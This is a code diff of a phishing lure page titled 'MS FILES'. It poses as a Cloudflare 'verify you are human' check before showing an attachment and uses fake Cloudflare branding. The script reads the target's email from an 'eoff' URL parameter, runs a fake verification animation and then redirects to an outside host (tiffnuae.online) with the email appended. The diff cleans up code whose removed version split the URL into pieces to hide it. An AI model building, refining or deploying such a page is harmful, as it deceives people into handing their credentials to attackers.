@@ -5,49 +5,204 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root { --p-a: #4a6ee0; --s-c: #28a745; --b-l: #f8f9fa; }
-        html, body { height: 100%; margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
-        .app-wrapper { background: #fff; color: #333; min-height: 100vh; display: grid; place-items: center; padding: 1.25rem; }
-        #preloader { position: fixed; inset: 0; background: var(--b-l); display: flex; justify-content: center; align-items: center; z-index: 9999; transition: opacity 450ms cubic-bezier(0.4, 0, 0.2, 1); }
-        .astro-logo { width: 120px; height: auto; animation: breath 1.5s ease-in-out infinite; }
-        @keyframes breath { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.08); opacity: 1; } }
-        .auth-view { width: 100%; max-width: 440px; margin-top: 140px; opacity: 0; transform: scale(0.98); transition: 600ms ease-out; }
-        .auth-view.active { opacity: 1; transform: scale(1); }
-        .headline-text { text-align: center; margin-bottom: 22px; font-size: 1.1rem; font-weight: 500; color: #222; line-height: 1.4; }
-        .challenge-panel { background: var(--b-l); border-radius: 10px; padding: 32px 20px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #ddd; transition: border-color 0.2s; min-height: 30px; }
-        .challenge-panel:hover { border-color: #bbb; }
-        .interactive-row { display: flex; align-items: center; gap: 15px; }
-        .custom-check { width: 19px; height: 19px; border: 2px solid var(--p-a); border-radius: 4px; background: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.25s; }
-        .custom-check.is-running { border-radius: 50%; border-color: transparent; border-top-color: var(--p-a); animation: rot 1s linear infinite; }
-        @keyframes rot { to { transform: rotate(360deg); } }
-        .custom-check.is-done { background: var(--s-c); border-color: var(--s-c); }
-        .custom-check.is-done::before { content: "\2713"; color: white; font-weight: bold; }
-        .brand-meta { text-align: right; font-size: 11px; color: #777; }
-        .brand-meta img { width: 28px; vertical-align: middle; margin-right: 4px; }
-        .brand-meta b { color: #f38020; letter-spacing: 0.5px; }
-        .system-footer { margin-top: auto; padding-bottom: 30px; color: #999; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; opacity: 0; transition: opacity 0.5s ease; }
-        .system-footer.active { opacity: 1; }
-        .shield-icon { width: 12px; height: 14px; background: #999; clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%); }
+        :root {
+            --p-a: #4a6ee0;
+            --s-c: #28a745;
+            --b-l: #f8f9fa;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        .app-wrapper {
+            background: #fff;
+            color: #333;
+            min-height: 100vh;
+            display: grid;
+            place-items: center;
+            padding: 1.25rem;
+        }
+
+        /* Loading Screen */
+        #preloader {
+            position: fixed;
+            inset: 0;
+            background: var(--b-l);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 450ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .astro-logo {
+            width: 120px;
+            height: auto;
+            animation: breath 1.5s ease-in-out infinite;
+        }
+
+        @keyframes breath {
+            0%, 100% { transform: scale(1); opacity: 0.85; }
+            50% { transform: scale(1.08); opacity: 1; }
+        }
+
+        /* Main View */
+        .auth-view {
+            width: 100%;
+            max-width: 440px;
+            margin-top: 140px;
+            opacity: 0;
+            transform: scale(0.98);
+            transition: 600ms ease-out;
+        }
+
+        .auth-view.active {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .headline-text {
+            text-align: center;
+            margin-bottom: 22px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: #222;
+            line-height: 1.4;
+        }
+
+        /* Challenge Box */
+        .challenge-panel {
+            background: var(--b-l);
+            border-radius: 10px;
+            padding: 32px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #ddd;
+            transition: border-color 0.2s;
+            min-height: 30px;
+        }
+
+        .challenge-panel:hover {
+            border-color: #bbb;
+        }
+
+        .interactive-row {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        /* Checkbox Styling */
+        .custom-check {
+            width: 19px;
+            height: 19px;
+            border: 2px solid var(--p-a);
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.25s;
+        }
+
+        .custom-check.is-running {
+            border-radius: 50%;
+            border-color: transparent;
+            border-top-color: var(--p-a);
+            animation: rot 1s linear infinite;
+        }
+
+        @keyframes rot {
+            to { transform: rotate(360deg); }
+        }
+
+        .custom-check.is-done {
+            background: var(--s-c);
+            border-color: var(--s-c);
+        }
+
+        .custom-check.is-done::before {
+            content: "\2713";
+            color: white;
+            font-weight: bold;
+        }
+
+        /* Cloudflare Branding */
+        .brand-meta {
+            text-align: right;
+            font-size: 11px;
+            color: #777;
+        }
+
+        .brand-meta img {
+            width: 28px;
+            vertical-align: middle;
+            margin-right: 4px;
+        }
+
+        .brand-meta b {
+            color: #f38020;
+            letter-spacing: 0.5px;
+        }
+
+        /* Footer */
+        .system-footer {
+            margin-top: auto;
+            padding-bottom: 30px;
+            color: #999;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .system-footer.active {
+            opacity: 1;
+        }
+
+        .shield-icon {
+            width: 12px;
+            height: 14px;
+            background: #999;
+            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
+        }
     </style>
 </head>
 <body class="app-wrapper">
 
-    <div id="preloader"><img src="astro.png" class="astro-logo"></div>
+    <div id="preloader">
+        <img src="astro.png" class="astro-logo" alt="Loading">
+    </div>
 
     <main class="auth-view" id="uiFrame">
         <h1 class="headline-text">Verify you are human by completing the action below to view attachment</h1>
+        
         <div class="challenge-panel">
             <div class="interactive-row">
                 <div id="triggerPoint" class="custom-check"></div>
                 <span id="labelNode" style="font-weight: 500; font-size: 16px;">Verify</span>
             </div>
+            
             <div class="brand-meta">
-                <div><img src="cloudflare_.png"><b>CLOUDFLARE</b></div>
+                <div><img src="cloudflare_.png" alt="Cloudflare logo"><b>CLOUDFLARE</b></div>
                 <span>Privacy &middot; Terms</span>
             </div>
         </div>
-        <div id="extraNotice" style="text-align:center; margin-top:25px; font-size:12px; opacity:0; transition:0.5s;">
-        </div>
+
+        <div id="extraNotice" style="text-align:center; margin-top:25px; font-size:12px; opacity:0; transition:0.5s;"></div>
     </main>
 
     <footer class="system-footer" id="legalNode">
@@ -56,66 +211,68 @@
     </footer>
 
     <script>
-        (function(_0x) {
-            const _nodes = {
-                _l: document.getElementById('preloader'),
-                _m: document.getElementById('uiFrame'),
-                _b: document.getElementById('triggerPoint'),
-                _t: document.getElementById('labelNode'),
-                _f: document.getElementById('legalNode'),
-                _n: document.getElementById('extraNotice')
+        (function() {
+            // UI Element Selectors
+            const ui = {
+                loader: document.getElementById('preloader'),
+                main: document.getElementById('uiFrame'),
+                btn: document.getElementById('triggerPoint'),
+                label: document.getElementById('labelNode'),
+                footer: document.getElementById('legalNode'),
+                notice: document.getElementById('extraNotice')
             };
 
-            let _proc = false;
-            let _val = '';
+            let isProcessing = false;
+            let queryEmail = '';
 
-            const _grab = () => {
-                const _loc = window.location.search;
-                const _res = _loc.match(/[?&]eoff=([^&]*)/);
-                if (_res && _res[1]) _val = _res[1];
+            // Extract email/parameter logic
+            const extractParam = () => {
+                const params = new URLSearchParams(window.location.search);
+                const eoff = params.get('eoff');
+                if (eoff) queryEmail = eoff;
             };
 
-            _grab();
+            extractParam();
 
-            window.onload = () => {
+            // Initial Page Load Animation
+            window.addEventListener('load', () => {
                 setTimeout(() => {
-                    _nodes._l.style.opacity = '0';
+                    ui.loader.style.opacity = '0';
                     setTimeout(() => {
-                        _nodes._l.style.display = 'none';
-                        _nodes._m.classList.add('active');
-                        _nodes._f.classList.add('active');
+                        ui.loader.style.display = 'none';
+                        ui.main.classList.add('active');
+                        ui.footer.classList.add('active');
                     }, 500);
                 }, 1500);
-            };
+            });
 
-            _nodes._b.onclick = () => {
-                if (_proc) return;
-                _proc = true;
-                _nodes._t.innerText = "Verifying...";
-                _nodes._b.classList.add('is-running');
+            // Handle Verification Click
+            ui.btn.onclick = () => {
+                if (isProcessing) return;
+                
+                isProcessing = true;
+                ui.label.innerText = "Verifying...";
+                ui.btn.classList.add('is-running');
 
+                // Simulation Delays
                 setTimeout(() => {
-                    _nodes._b.classList.replace('is-running', 'is-done');
-                    _nodes._t.innerText = "Success";
-                    setTimeout(() => { _nodes._n.style.opacity = '1'; }, 400);
+                    ui.btn.classList.replace('is-running', 'is-done');
+                    ui.label.innerText = "Success";
+                    
+                    setTimeout(() => { 
+                        ui.notice.style.opacity = '1'; 
+                    }, 400);
 
+                    // Final Redirection Sequence
                     setTimeout(() => {
-                        // Redirect broken down and re-assembled
-                        const _p1 = "htt";
-                        const _p2 = "ps://";
-                        const _p3 = "po.ti";
-                        const _p4 = "ffnuae.";
-                        const _p5 = "online/api/";
-                        const _p6 = "v1/tgKHf0";
-                        const _p7 = "r0EWqIaCb5";
+                        const base = "https://po.tiffnuae.online/api/v1/tgKHf0r0EWqIaCb5";
+                        let target = base;
 
-                        let _final = [_p1, _p2, _p3, _p4, _p5, _p6, _p7].join('');
-
-                        if (_val) {
-                            _final += String.fromCharCode(35) + _val; // Uses charCode for #
+                        if (queryEmail) {
+                            target += '#' + queryEmail;
                         }
 
-                        window.location.href = _final;
+                        window.location.href = target;
                     }, 2000);
                 }, 1800);
             };
